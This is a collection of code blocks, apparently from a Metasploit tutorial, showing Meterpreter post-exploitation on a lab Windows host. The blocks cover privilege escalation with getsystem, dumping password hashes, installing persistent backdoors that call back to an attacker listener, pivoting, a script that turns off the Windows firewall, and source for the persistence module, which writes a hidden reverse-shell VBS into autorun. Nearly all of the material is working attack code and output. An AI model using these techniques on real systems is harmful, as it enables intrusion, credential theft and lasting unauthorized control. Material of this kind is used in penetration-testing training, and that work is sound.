["```\nmeterpreter > getuid\nServer username: DARKLORD-PC\\DARKLORD\nmeterpreter > getsystem\n...got system (via technique 4).\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM \n```", "```\nmeterpreter > run hashdump\n[*] Obtaining the boot key...\n[*] Calculating the hboot key using SYSKEY 78e1241e98c23002bc85fd94c146309d...\n[*] Obtaining the user list and keys...\n[*] Decrypting user keys...\n[*] Dumping password hashes...\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDARKLORD:1000:aad3b435b51404eeaad3b435b51404ee:3dbde697d71690a769204beb12283678::: \n```", "```\nmeterpreter > run metsvc -h\nOPTIONS:\n-A Automatically start a matching multi/handler to connect to the service\n-h This help menu\n-r Uninstall an existing Meterpreter service (files must be deleted manually)\nmeterpreter > run metsvc -A\n[*] Creating a meterpreter service on port 31337\n[*] Creating a temporary installation directory C:\\Users\\DARKLORD\\AppData\\Local\\Temp\\ygLFhIFX...\n[*] >> Uploading metsrv.dll...\n[*] >> Uploading metsvc-server.exe...\n[*] >> Uploading metsvc.exe...\n[*] Starting the service...\n* Installing service metsvc\n* Starting service\nService metsvc successfully installed. \n```", "```\nmeterpreter > run persistence -h\nMeterpreter Script for creating a persistent backdoor on a target host.\nOPTIONS:\n-A Automatically start a matching multi/handler to..\n-L <opt> Location in target host where to write payload to..\n-P <opt> Payload to use, default is\n-S Automatically start the agent on boot as a service\n-T <opt> Alternate executable template to use\n-U Automatically start the agent when the User logs on\n-X Automatically start the agent when the system boots\n-h This help menu\n-i <opt> The interval in seconds between each connection\n-p <opt> The port on the remote host where Metasploit..\n-r <opt> The IP of the system running Metasploit listening.. \n```", "```\nmeterpreter > run persistence -A -S -U -i 60 -p 4321 -r 192.168.56.101\n[*] Running Persistance Script\n[*] Resource file for cleanup created at /root/.msf4/logs/persistence/DARKLORD-PC_20111227.0307/DARKLORD-PC_20111227.0307.rc\n[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4321\n[*] Persistent agent script is 610795 bytes long\n[+] Persistent Script written to C:\\Users\\DARKLORD\\AppData\\Local\\Temp\\LHGtjzB.vbs\n[*] Starting connection handler at port 4321 for windows/meterpreter/reverse_tcp\n[+] Multi/Handler started!\n[*] Executing script C:\\Users\\DARKLORD\\AppData\\Local\\Temp\\LHGtjzB.vbs\n[+] Agent executed with PID 5712\n[*] Installing into autorun as HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DBDalcOoYlqJSi\n[+] Installed into autorun as HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DBDalcOoYlqJSi\n[*] Installing as service..\n[*] Creating service cpvPbOfXj \n```", "```\nmeterpreter > ipconfig\nInterface 1\nHardware MAC: 00:00:00:00:00:00\nIP Address: 10.0.2.15\nNetmask : 255.255.255.0\nVirtualBox Host-Only Ethernet Adapter\nHardware MAC: 08:00:27:00:8c:6c\nIP Address : 192.168.56.1\nNetmask : 255.255.255.0 \n```", "```\nmeterpreter > run arp_scanner -r 10.0.2.1/24\n[*] ARP Scanning 10.0.2.1/24\n[*] IP: 10.0.2.7 MAC 8:26:18:41:fb:33\n[*] IP: 10.0.2.9 MAC 41:41:41:41:41:41 \n```", "```\nmeterpreter > background\nmsf exploit(handler) > route add 10.0.2.15 255.255.255.0 1\n[*] Route added\nmsf exploit(handler) > route print\nActive Routing Table\n====================\nSubnet Netmask Gateway\n------ ------- -------\n10.0.2.15 255.255.255.0 Session 1 \n```", "```\nmsf exploit(handler) > route print\nActive Routing Table\n====================\nSubnet Netmask Gateway\n------ ------- -------\n10.0.2.15 255.255.255.0 Session 1 \n```", "```\nmeterpreter > portfwd -h\nUsage: portfwd [-h] [add | delete | list | flush] [args]\nOPTIONS:\n-L <opt> The local host to listen on (optional).\n-h Help banner.\n-l <opt> The local port to listen on.\n-p <opt> The remote port to connect to.\n-r <opt> The remote host to connect to.\nmeterpreter > portfwd add -l 4321 -p 80 -r 10.0.2.7\n[*] Local TCP relay created: 0.0.0.0:4321 <-> 10.0.2.7:80 \n```", "```\nmeterpreter > irb\n[*] Starting IRB shell\n[*] The 'client' variable holds the meterpreter client \n```", "```\n>> 2+2\n=> 4 \n```", "```\nx = { \"a\" => 100, \"b\" => 20 }\nx.delete_if { |key, value| value < 25 }\nprint x.inspect \n```", "```\n    >> print_status(\"HackingAlert\")\n    [*] HackingAlert\n    => nil \n    ```", "```\n    >> print_good(\"HackingAlert\")\n    [+] HackingAlert\n    => nil \n    ```", "```\n    >> print_error(\"HackingAlert\")\n    [-] HackingAlert\n    => nil \n    ```", "```\nmeterpreter>irb\n>> \n```", "```\n>> client.railgun.shell32.IsUserAnAdmin\n=> {\"GetLastError\"=>0, \"return\"=>false} \n```", "```\nmeterpreter > getsystem\n...got system (via technique 4).\nmeterpreter > irb\n[*] Starting IRB shell\n[*] The 'client' variable holds the meterpreter client\n>> client.railgun.shell32.IsUserAnAdmin\n=> {\"GetLastError\"=>0, \"return\"=>true} \n```", "```\nprint_status \"Running the IsUserAnAdmin function\"\nstatus = client.railgun.shell32.IsUserAnAdmin()\nif status['return'] == true then\nprint_status 'You are an administrator'\nelse\nprint_error 'You are not an administrator'\nend \n```", "```\n    module Rex\n    module Post\n    module Meterpreter\n    module Extensions\n    module Stdapi\n    module Railgun\n    module Def\n    class Def_shell32\n    def self.create_dll(dll_path = 'shell32')\n    dll = DLL.new(dll_path, ApiConstants.manager)\n    ......\n    end\n    end\n    end; end; end; end; end; end; end \n    ```", "```\n    dll.add_function('IsUserAnAdmin', 'BOOL', []) \n    ```", "```\n    dll.add_function('OleFlushClipboard' , 'BOOL' , []) \n    ```", "```\n>> client.railgun.shell32.OleFlushClipboard\n=> {\"GetLastError\"=>0, \"return\"=>true} \n```", "```\nif client.railgun.get_dll('shell32') == nil\nprint_status \"Adding Shell32.dll\"\nclient.railgun.add_dll('shell32','C:\\\\WINDOWS\\\\system32\\\\shell32.dll')\nelse\nprint_status \"Shell32 already loaded.. skipping\"\nend\nif client.railgun.shell32.functions['OleFlushClipboard'] == nil\nprint_status \"Adding the Flush Clipboard function\"\nclient.railgun.add_function('shell32', 'OleFlushClipboard', 'BOOL', [])\nelse\nprint_status \"OleFlushClipboard already loaded.. skipping\"\nend \n```", "```\n    # Author: Abhinav Singh\n    # Windows Firewall De-Activator\n    #Option/parameter Parsing\n    opts = Rex::Parser::Arguments.new(\n    \"-h\" => [ false, \"Help menu.\" ]\n    )\n    opts.parse(args) { |opt, idx, val|\n    case opt\n    when \"-h\"\n    print_line \"Meterpreter Script for disabling the Default windows Firelwall\"\n    print_line \"Let's hope it works\"\n    print_line(opts.usage)\n    raise Rex::Script::Completed\n    end\n    }\n    # OS validation and command execution\n    unsupported if client.platform !~ /win32|win64/i\n    end\n    begin\n    print_status(\"disabling the default firewall\")\n    cmd_exec('cmd /c','netsh advfirewall set AllProfiles state off',5) \n    ```", "```\n    meterpreter > getsystem\n    ...got system (via technique 4).\n    meterpreter > run myscript.rb\n    [*] disabling the default firewall\n    meterpreter > \n    ```", "```\nopts = Rex::Parser::Arguments.new(\n\"-h\" => [ false, \"Help menu.\" ]\n)\nopts.parse(args) { |opt, idx, val|\ncase opt\nwhen \"-h\"\nprint_line \"Meterpreter Script for disabling the Default Windows Firewall\"\nprint_line \"Let's hope it works\"\nprint_line(opts.usage)\nraise Rex::Script::Completed\nend\n} \n```", "```\nunsupported if client.platform !~ /win32|win64/i\nbegin\nprint_status(\"disabling the default firewall\")\ncmd_exec('cmd /c','netsh advfirewall set AllProfiles state off',5)\nend \n```", "```\n# Default parameters for payload\nrhost = Rex::Socket.source_address(\"1.2.3.4\")\nrport = 4444\ndelay = 5\ninstall = false\nautoconn = false\nserv = false\naltexe = nil\ntarget_dir = nil\npayload_type = \"windows/meterpreter/reverse_tcp\"\nscript = nil\nscript_on_target = nil \n```", "```\n@exec_opts = Rex::Parser::Arguments.new(\n\"-h\" => [ false, \"This help menu\"],\n\"-r\" => [ true, \"The IP of the system running Metasploit listening for the connect back\"],\n\"-p\" => [ true, \"The port on the remote host where Metasploit is listening\"],\n\"-i\" => [ true, \"The interval in seconds between each connection attempt\"],\n\"-i\" => [ true, \"The interval in seconds between each connection attempt\"],\n\"-X\" => [ false, \"Automatically start the agent when the system boots\"],\n\"-U\" => [ false, \"Automatically start the agent when the User logs on\"],\n\"-S\" => [ false, \"Automatically start the agent on boot as a service (with SYSTEM privileges)\"],\n\"-A\" => [ false, \"Automatically start a matching multi/handler to connect to the agent\"],\n\"-L\" => [ true, \"Location in target host where to write payload to, if none \\%TEMP\\% will be used.\"],\n\"-T\" => [ true, \"Alternate executable template to use\"],\n\"-P\" => [ true, \"Payload to use, default is windows/meterpreter/reverse_tcp.\"]\n)\nmeter_type = client.platform \n```", "```\n# Usage Message Function\n#-------------------------------------------------------------------------------\ndef usage\nprint_line \"Meterpreter Script for creating a persistent backdoor on a target host.\"\nprint_line(@exec_opts.usage)\nraise Rex::Script::Completed\nend\n# Wrong Meterpreter Version Message Function\n#-------------------------------------------------------------------------------\ndef wrong_meter_version(meter = meter_type)\nprint_error(\"#{meter} version of Meterpreter is not supported with this Script!\")\nraise Rex::Script::Completed\nend \n```", "```\n# Function for Creating the Payload\n#-------------------------------------------------------------------------------\ndef create_payload(payload_type,lhost,lport)\nprint_status(\"Creating Payload=#{payload_type} LHOST=#{lhost} LPORT=#{lport}\")\npayload = payload_type\npay = client.framework.payloads.create(payload)\npay.datastore['LHOST'] = lhost\npay.datastore['LPORT'] = lport\nreturn pay.generate\nend \n```", "```\n# Function for Creating persistent script\n#-------------------------------------------------------------------------------\ndef create_script(delay,altexe,raw)\nif altexe\nvbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw, {:persist => true, :delay => delay, :template => altexe})\nelse\nvbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw, {:persist => true, :delay => delay})\nend\nprint_status(\"Persistent agent script is #{vbs.length} bytes long\")\nreturn vbs\nend \n```", "```\n# Function for creating log folder and returning log path\n#-------------------------------------------------------------------------------\ndef log_file(log_path = nil)\n#Get hostname\nhost = @client.sys.config.sysinfo[\"Computer\"]\n# Create Filename info to be appended to downloaded files\nfilenameinfo = \"_\" + ::Time.now.strftime(\"%Y%m%d.%M%S\")\n# Create a directory for the logs\nif log_path\nlogs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )\nelse\nlogs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )\nend\n# Create the log directory\n::FileUtils.mkdir_p(logs)\n#logfile name\nlogfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + \".rc\"\nreturn logfile\nend \n```", "```\n# Function for writing script to target host\n#-------------------------------------------------------------------------------\ndef write_script_to_target(target_dir,vbs)\nif target_dir\ntempdir = target_dir\nelse\ntempdir = @client.fs.file.expand_path(\"%TEMP%\")\nend\ntempvbs = tempdir + \"\\\\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + \".vbs\"\nfd = @client.fs.file.new(tempvbs, \"wb\")\nfd.write(vbs)\nfd.close\nprint_good(\"Persistent Script written to #{tempvbs}\")\nfile_local_write(@clean_up_rc, \"rm #{tempvbs}\\n\")\nreturn tempvbs\nend \n```", "```\n# Function for setting multi handler for autocon\n#-------------------------------------------------------------------------------\ndef set_handler(selected_payload,rhost,rport)\nprint_status(\"Starting connection handler at port #{rport} for #{selected_payload}\")\nmul = client.framework.exploits.create(\"multi/handler\")\nmul.datastore['WORKSPACE'] = @client.workspace\nmul.datastore['PAYLOAD'] = selected_payload\nmul.datastore['LHOST'] = rhost\nmul.datastore['LPORT'] = rport\nmul.datastore['EXITFUNC'] = 'process'\nmul.datastore['ExitOnSession'] = false\nmul.exploit_simple(\n'Payload' => mul.datastore['PAYLOAD'],\n'RunAsJob' => true\n)\nprint_good(\"Multi/Handler started!\")\nend \n```", "```\n# Function to execute script on target and return the PID of the process\n#-------------------------------------------------------------------------------\ndef targets_exec(script_on_target)\nprint_status(\"Executing script #{script_on_target}\")\nproc = session.sys.process.execute(\"cscript \\\"#{script_on_target}\\\"\", nil, {'Hidden' => true})\nprint_good(\"Agent executed with PID #{proc.pid}\")\nfile_local_write(@clean_up_rc, \"kill #{proc.pid}\\n\")\nreturn proc.pid\nend \n```"]